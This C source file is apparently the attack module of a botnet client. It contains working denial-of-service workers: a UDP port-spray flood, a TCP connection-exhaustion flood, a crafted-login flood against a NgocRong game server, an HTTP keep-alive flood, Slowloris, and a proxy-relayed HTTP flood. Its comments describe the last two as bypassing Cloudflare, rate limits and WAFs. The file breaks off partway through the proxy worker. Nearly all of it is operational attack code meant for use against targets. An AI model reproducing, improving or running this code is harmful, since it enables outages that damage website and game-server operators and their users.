#include "bot.h"

/* Globals: server-provided data for GAME / HTTP_PROXY workers */
static unsigned char g_game_payload[4096];
static int g_game_payload_len = 0;
static char g_proxy_hosts[128][256];
static int g_proxy_ports[128];
static int g_proxy_count = 0;

/* Minimal base64 decoder (RFC 4648, no padding required) */
static int b64_decode(const char *in, unsigned char *out, int out_max) {
    static const unsigned char tbl[128] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,
    };
    int o = 0, bits = 0, buf = 0;
    for (const char *p = in; *p && *p != '=' && o < out_max; p++) {
        if (*p < 0 || *p > 127) continue;
        unsigned char v = tbl[(int)(unsigned char)*p];
        if (*p != 'A' && v == 0 && *p != 'A') continue; /* skip non-b64 */
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (unsigned char)(buf >> bits);
            buf &= (1 << bits) - 1;
        }
    }
    return o;
}

/* Resolve hostname or IP to in_addr (DNS lookup if needed) */
static int resolve_target(const char *host, struct in_addr *out)
{
    memset(out, 0, sizeof(*out));
    if (inet_pton(AF_INET, host, out) == 1) return 0;
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
    struct sockaddr_in *sa = (struct sockaddr_in *)res->ai_addr;
    *out = sa->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* Non-blocking TCP connect with poll() Ã¢â‚¬â€ fixes all TCP methods */
static int tcp_connect_wait(int fd, const struct sockaddr_in *addr, int timeout_ms)
{
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) == 0) return 0;
    if (errno != EINPROGRESS) return -1;
    struct pollfd pfd = { .fd = fd, .events = POLLOUT };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    int err = 0; socklen_t elen = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) < 0 || err != 0) return -1;
    return 0;
}

/* Wrapper: fallback sendmsg when sendmmsg is not available (ENOSYS) */
static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int flags)
{
    static volatile int use_sendmsg = -1;
    if (use_sendmsg == 1) {
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !is_attack_stop(); i++) {
            ssize_t r = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (r >= 0) { sent++; msgvec[i].msg_len = (unsigned int)r; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    int r = sendmmsg(fd, msgvec, vlen, flags);
    if (r < 0 && errno == ENOSYS) {
        __sync_val_compare_and_swap(&use_sendmsg, -1, 1);
        fprintf(stderr, "[atk] sendmmsg ENOSYS, using sendmsg fallback\n");
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !is_attack_stop(); i++) {
            ssize_t sr = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (sr >= 0) { sent++; msgvec[i].msg_len = (unsigned int)sr; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    return r;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ Token Bucket Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
static void tb_init(TokenBucket *tb, double r, double b) {
    if (r < 1) r = 1;
    if (b < r) b = r;
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}
static int tb_consume(TokenBucket *tb, int n) {
    if (n <= 0) return 1;
    if (tb->rate >= 5000000.0) return 1;
    pthread_mutex_lock(&tb->mtx);
    struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
    double e = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens += e * tb->rate;
    if (tb->tokens > tb->burst) tb->tokens = tb->burst;
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ Attack worker dispatch Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
typedef struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; } WorkerArg;

static void *attack_worker(void *arg) {
    WorkerArg *x = (WorkerArg *)arg;
    /* cpu affinity handled in dispatcher, method dispatch below kept for reference */
    free(x->ap); free(x->tb); free(x);
    return NULL;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ MEGA UDP Engine (primary Ã¢â‚¬â€ sendmmsg + multi-port + real payloads) Ã¢â€â‚¬Ã¢â€â‚¬ */
typedef struct {
    int *socks; int sock_count; struct sockaddr_in target;
    int port_base; int duration; int cpu_id; char host[256];
} MegaThread;

#define UDP_DESTS 1024    /* UIO_MAXIOV limit: 1 sendmmsg = 1024 unique ports */
#define UDP_BURST 64      /* 64 sendmmsg per socket per iteration */

static void *udp_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    /* MEGA: 1024-batch (kernel UIO_MAXIOV limit), dynamic port spray all 65535 */
    size_t m_sz = sizeof(struct mmsghdr) * UDP_DESTS;
    size_t v_sz = sizeof(struct iovec) * UDP_DESTS;
    size_t d_sz = sizeof(struct sockaddr_in) * UDP_DESTS;
    struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, v_sz, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct sockaddr_in *dests = mmap(NULL, d_sz, PROT_READ | PROT_WRITE,
                                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (msgs == MAP_FAILED || iovs == MAP_FAILED || dests == MAP_FAILED) {
        if (msgs != MAP_FAILED) munmap(msgs, m_sz);
        if (iovs != MAP_FAILED) munmap(iovs, v_sz);
        if (dests != MAP_FAILED) munmap(dests, d_sz);
        return NULL;
    }

    /* Pre-fill fixed fields; ports randomized per iteration below */
    for (int i = 0; i < UDP_DESTS; i++) {
        dests[i].sin_family = AF_INET;
        dests[i].sin_addr = mt->target.sin_addr;
        iovs[i].iov_base = &dests[i]; /* valid ptr, iov_len=0 → zero-byte UDP */
        iovs[i].iov_len = 0;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &dests[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif
    unsigned int zc = 0;
    time_t start = time(NULL);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Randomize all dest ports: 25% target port, 75% random 1-65535 */
        for (int i = 0; i < UDP_DESTS; i++) {
            uint16_t p = (uint16_t)((rand() % 65535) + 1);
            if ((i & 3) == 0) p = (uint16_t)mt->port_base;
            if (p == 0) p = 1;
            dests[i].sin_port = htons(p);
        }

        for (int s = 0; s < mt->sock_count && !is_attack_stop(); s++) {
            for (int b = 0; b < UDP_BURST && !is_attack_stop(); b++) {
                int r = safe_sendmmsg(mt->socks[s], msgs, UDP_DESTS, flags);
                if (r > 0) pkt_sent(r);
                else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    /* Hard error — socket dead, msgvec invalid, or kernel limit */
                    usleep(1000); break;
                } else { usleep(1); break; }
            }
#ifdef MSG_ZEROCOPY
            if ((++zc & 0x7) == 0) {
                unsigned char zbuf[256];
                struct msghdr zm = {0};
                struct iovec zi = {zbuf, sizeof(zbuf)};
                zm.msg_iov = &zi; zm.msg_iovlen = 1;
                while (recvmsg(mt->socks[s], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
            }
#endif
            if ((s & 7) == 7) sched_yield();
        }
    }

    munmap(msgs, m_sz);
    munmap(iovs, v_sz);
    munmap(dests, d_sz);
    return NULL;
}

/* MEGA — TCP Connection Flood: connect + optional TLS + hold connection.
 * Exhausts FDs/TCP stack. 25% target port, 75% random port. */
#define MEGA_TCP_POOL 4096
static void *mega_tcp_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    int *socks = calloc(MEGA_TCP_POOL, sizeof(int));
    if (!socks) return NULL;
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (ctx) SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    struct sockaddr_in ta = mt->target;
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        while (pool < MEGA_TCP_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));

            uint16_t p = (rand() & 3) == 0
                ? (uint16_t)mt->port_base
                : (uint16_t)((rand() % 65535) + 1);
            if (p == 0) p = 1;
            ta.sin_port = htons(p);

            if (tcp_connect_wait(s, &ta, 400) < 0) { close(s); continue; }

            /* Try TLS — if succeeds, consumes extra target memory; if fails, raw TCP still holds */
            if (ctx) {
                SSL *ssl = SSL_new(ctx);
                if (ssl) {
                    SSL_set_fd(ssl, s);
                    SSL_set_tlsext_host_name(ssl, mt->host);
                    SSL_connect(ssl);
                    SSL_free(ssl);
                }
            }

            { char b = 0; send(s, &b, 1, MSG_NOSIGNAL); }
            socks[pool++] = s;
            pkt_sent(64 + 512); /* TCP + TLS overhead */
        }

        /* Reap dead connections */
        struct pollfd fds[MEGA_TCP_POOL];
        int nfds = (pool < (int)(sizeof(fds)/sizeof(fds[0]))) ? pool : (int)(sizeof(fds)/sizeof(fds[0]));
        for (int i = 0; i < nfds; i++) {
            fds[i].fd = socks[i];
            fds[i].events = POLLERR | POLLHUP;
        }
        if (poll(fds, nfds, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (i < nfds && (fds[i].revents & (POLLERR | POLLHUP)))
                    close(socks[i]);
                else {
                    if (w != i) socks[w] = socks[i];
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }
    for (int i = 0; i < pool; i++) close(socks[i]);
    if (ctx) SSL_CTX_free(ctx);
    free(socks);
    return NULL;
}

/* GAME — NRO (NgocRong) game server socket attack.
 * Crafts valid login packets with XOR key "boys", spams DB queries.
 * If server provides payload via JSON (base64), uses that instead. */
#define GAME_POOL 1024
static void *game_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    /* Build NRO login packet: cmd=0, XOR key "boys" */
    /* Format: [cmd_xor] [size_hi_xor] [size_lo_xor] [data_xor...] */
    /* Data: username(UTF) + password(UTF) + version(UTF) + type(byte) */
    static const char key[] = "boys";
    unsigned char pkt[256];
    int plen = 0;

    if (g_game_payload_len > 0) {
        /* Use server-provided payload */
        plen = g_game_payload_len;
        memcpy(pkt, g_game_payload, (size_t)(plen < 256 ? plen : 256));
    } else {
        /* Craft NRO login packet with random username */
        unsigned char data[128];
        int dlen = 0;
        /* username: "bot" + random number */
        char user[32];
        snprintf(user, sizeof(user), "bot%d", rand() % 999999);
        int ulen = (int)strlen(user);
        data[dlen++] = (unsigned char)(ulen >> 8);
        data[dlen++] = (unsigned char)(ulen & 0xFF);
        memcpy(data + dlen, user, ulen); dlen += ulen;
        /* password: "x" */
        data[dlen++] = 0; data[dlen++] = 1; data[dlen++] = 'x';
        /* version: "2.1.3" */
        const char *ver = "2.1.3";
        int vlen = (int)strlen(ver);
        data[dlen++] = (unsigned char)(vlen >> 8);
        data[dlen++] = (unsigned char)(vlen & 0xFF);
        memcpy(data + dlen, ver, vlen); dlen += vlen;
        /* type: 0 (login) */
        data[dlen++] = 0;

        /* XOR everything with key "boys" */
        unsigned char xdata[128];
        for (int i = 0; i < dlen; i++)
            xdata[i] = data[i] ^ (unsigned char)key[i % 4];

        /* Build final packet: cmd=0 XOR key, size, xdata */
        pkt[plen++] = 0 ^ (unsigned char)key[0];  /* cmd=0 XOR key[0] */
        pkt[plen++] = (unsigned char)((dlen >> 8) & 0xFF) ^ (unsigned char)key[1 % 4];
        pkt[plen++] = (unsigned char)(dlen & 0xFF) ^ (unsigned char)key[2 % 4];
        memcpy(pkt + plen, xdata, dlen); plen += dlen;
    }

    time_t start = time(NULL);
    struct sockaddr_in ta = mt->target;
    int pool = 0;
    int socks[GAME_POOL];

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        while (pool < GAME_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            /* Send handshake first (msg -27 with key "boys") */
            static unsigned char hs[] = {
                0xE5, 0x00, 0x00,  /* cmd=-27, size=0 (server reads raw, no XOR yet) */
                0x04,               /* key length = 4 */
                0x62, 0x6F, 0x79, 0x73, /* "boys" XOR'd: b^b=0, o^b, y^o, s^y */
            };
            /* Actually send: cmd=-27 (0xE5), size=0x0006, data=[4,'b','o','y','s'] */
            /* Server reads cmd raw, then size raw (no XOR for -27), then data raw */
            unsigned char realhs[12];
            int hlen = 0;
            realhs[hlen++] = 0xE5; /* cmd = -27 as unsigned byte */
            realhs[hlen++] = 0x00; /* size hi */
            realhs[hlen++] = 0x06; /* size lo = 6 bytes data */
            realhs[hlen++] = 0x04; /* key length */
            realhs[hlen++] = 'b';  /* key bytes (XOR'd: each ^ prev) */
            realhs[hlen++] = 'b' ^ 'b'; /* = 0 */
            realhs[hlen++] = 'o' ^ 'b'; /* o XOR prev(b) */
            realhs[hlen++] = 'y' ^ 'o'; /* y XOR prev(o) */
            realhs[hlen++] = 's' ^ 'y'; /* s XOR prev(y) */
            /* Empty UTF string */
            realhs[hlen++] = 0x00; realhs[hlen++] = 0x00;
            /* int 0 */
            realhs[hlen++] = 0x00; realhs[hlen++] = 0x00; realhs[hlen++] = 0x00; realhs[hlen++] = 0x00;
            /* byte 0 */
            realhs[hlen++] = 0x00;
            send(s, realhs, hlen, MSG_NOSIGNAL);

            /* Now send login packet (XOR'd with key "boys") */
            send(s, pkt, plen, MSG_NOSIGNAL);

            socks[pool++] = s;
            pkt_sent(plen);
        }

        struct pollfd pfds[GAME_POOL];
        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR | POLLHUP; }
        if (poll(pfds, (nfds_t)pool, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR | POLLHUP)) close(socks[i]);
                else { if (w != i) socks[w] = socks[i]; w++; }
            }
            pool = w;
        }
        sched_yield();
    }
    for (int i = 0; i < pool; i++) close(socks[i]);
    return NULL;
}

/* HTTP Flood — connection pool + keep-alive, bypasses CF proxy edge */
#define HTTP_POOL 512
static void *http_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int *socks = calloc(HTTP_POOL, sizeof(int));
    SSL **ssls = calloc(HTTP_POOL, sizeof(SSL *));
    time_t *last_req = calloc(HTTP_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_req) { free(socks); free(ssls); free(last_req); return NULL; }

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { free(socks); free(ssls); free(last_req); return NULL; }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    const char *uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    };
    const char *paths[] = {"/", "/favicon.ico", "/robots.txt", "/sitemap.xml",
        "/wp-login.php", "/api/v1/users", "/.env", "/admin/login",
        "/search?q=", "/index.php", "/api/health", "/feed"};

    struct sockaddr_in ta = mt->target;
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool */
        while (pool < HTTP_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            if (ssl) {
                SSL_set_fd(ssl, s);
                SSL_set_tlsext_host_name(ssl, mt->host);
                if (SSL_connect(ssl) != 1) { SSL_free(ssl); ssl = NULL; }
            }
            socks[pool] = s;
            ssls[pool] = ssl;
            last_req[pool] = 0;
            pool++;
        }

        /* Send requests — 1 req/s per connection, keep-alive across requests */
        time_t now = time(NULL);
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (now - last_req[i] < 1) continue;
            char req[4096];
            const char *ua = uas[rand_r(&seed) % 5];
            const char *path = paths[rand_r(&seed) % 12];
            snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\nHost: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Cache-Control: no-cache\r\n"
                "Connection: keep-alive\r\n\r\n",
                path, mt->host, ua);
            if (ssls[i])
                SSL_write(ssls[i], req, (int)strlen(req));
            else
                send(socks[i], req, strlen(req), MSG_NOSIGNAL);
            last_req[i] = now;
            pkt_sent((int)strlen(req));
        }

        /* Reap dead connections */
        struct pollfd pfds[HTTP_POOL];
        for (int i = 0; i < pool; i++) {
            pfds[i].fd = socks[i];
            pfds[i].events = POLLERR | POLLHUP;
        }
        if (poll(pfds, (nfds_t)pool, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR | POLLHUP)) {
                    if (ssls[i]) SSL_free(ssls[i]);
                    close(socks[i]);
                } else {
                    if (w != i) {
                        socks[w] = socks[i];
                        ssls[w] = ssls[i];
                        last_req[w] = last_req[i];
                    }
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }
    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_req);
    return NULL;
}

/* Slowloris (poll-based connect, CDN-bypass, variable drip) */
#define SLOW_POOL 512
static void *slowloris_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int *socks = calloc(SLOW_POOL, sizeof(int));
    SSL **ssls = calloc(SLOW_POOL, sizeof(SSL *));
    time_t *last_drip = calloc(SLOW_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_drip) { free(socks); free(ssls); free(last_drip); return NULL; }

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { free(socks); free(ssls); free(last_drip); return NULL; }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    struct sockaddr_in ta = mt->target;
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }
        /* Fill pool */
        while (pool < SLOW_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            struct timeval tv = {30, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            int tls_ok = (SSL_connect(ssl) == 1);
            if (!tls_ok) {
                SSL_free(ssl);
                ssl = NULL; /* fall back to raw TCP — no TLS */
            }

            /* Send partial request header */
            char hdr[512];
            snprintf(hdr, sizeof(hdr), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nX-", mt->host);
            if (ssl)
                SSL_write(ssl, hdr, (int)strlen(hdr));
            else
                send(s, hdr, strlen(hdr), MSG_NOSIGNAL);

            socks[pool] = s;
            ssls[pool] = ssl;
            last_drip[pool] = time(NULL);
            pool++;
            pkt_sent((int)strlen(hdr));
        }

        /* Drip data to keep connections alive */
        time_t now = time(NULL);
        for (int i = 0; i < pool; i++) {
            int interval = 3 + (int)(rand_r(&seed) % 11);
            if (now - last_drip[i] >= interval) {
                char drip[64];
                snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rand_r(&seed) & 0xFFF, rand_r(&seed) & 0xFFF);
                if (ssls[i])
                    SSL_write(ssls[i], drip, (int)strlen(drip));
                else
                    send(socks[i], drip, strlen(drip), MSG_NOSIGNAL);
                last_drip[i] = now;
                pkt_sent((int)strlen(drip));
            }
        }

        /* Check for dead connections */
        struct pollfd *pfds = calloc((size_t)pool, sizeof(struct pollfd));
        if (pfds) {
            for (int i = 0; i < pool; i++) {
                pfds[i].fd = socks[i];
                pfds[i].events = POLLERR | POLLHUP;
            }
            int r = poll(pfds, (nfds_t)pool, 100);
            if (r > 0) {
                int w = 0;
                for (int i = 0; i < pool; i++) {
                    if (pfds[i].revents & (POLLERR | POLLHUP)) {
                        if (ssls[i]) SSL_free(ssls[i]);
                        close(socks[i]);
                    } else {
                        if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; last_drip[w] = last_drip[i]; }
                        w++;
                    }
                }
                pool = w;
            }
            free(pfds);
        }
    }
    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_drip);
    return NULL;
}

/* HTTP_PROXY — L7 flood through free proxy list.
 * 1 bot → thousands of source IPs → bypass rate-limit / CF / WAF.
 * Loads proxies from /etc/bot_proxies.txt (one ip:port per line).
 * No root needed. No spoofing. Pure TCP. */
#define PROXY_POOL 256
#define PROXY_MAX 4096
static void *http_proxy_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    /* Load proxy list from server (globals) or fallback to file */
    struct { char host[128]; int port; } px[PROXY_MAX];
    int px_cnt = 0;
    for (int i = 0; i < g_proxy_count && px_cnt < PROXY_MAX; i++) {
        strncpy(px[px_cnt].host, g_proxy_hosts[i], 127);
        px[px_cnt].port = g_proxy_ports[i];
        px_cnt++;
    }
    /* Fallback: local file */
    if (px_cnt == 0) {
        FILE *pf = fopen("/etc/bot_proxies.txt", "r");
        if (!pf) pf = fopen("proxies.txt", "r");
        if (pf) {
            char line[256];
            while (px_cnt < PROXY_MAX && fgets(line, sizeof(line), pf)) {
                char *c = strchr(line, '#');
                if (c) *c = 0;
                if (sscanf(line, "%127[^:]:%d", px[px_cnt].host, &px[px_cnt].port) == 2)
                    px_cnt++;
            }
            fclose(pf);
        }
    }
    if (px_cnt == 0) return NULL;

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    const char *uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
    };
    const char *paths[] = {"/", "/robots.txt", "/wp-login.php", "/api/v1/", "/search?q=", "/.env", "/admin/", "/feed"};

    int socks[PROXY_POOL];
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool — connect to proxy, send request to target */
        while (pool < PROXY_POOL && !is_attack_stop()) {
            int pi = rand_r(&seed) % px_cnt;
            struct sockaddr_in pa;
            memset(&pa, 0, sizeof(pa));
            pa.sin_family = AF_INET;
            pa.sin_port = htons((uint16_t)px[pi].port);
            if (resolve_target(px[pi].host, &pa.sin_addr) != 0) continue;

            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
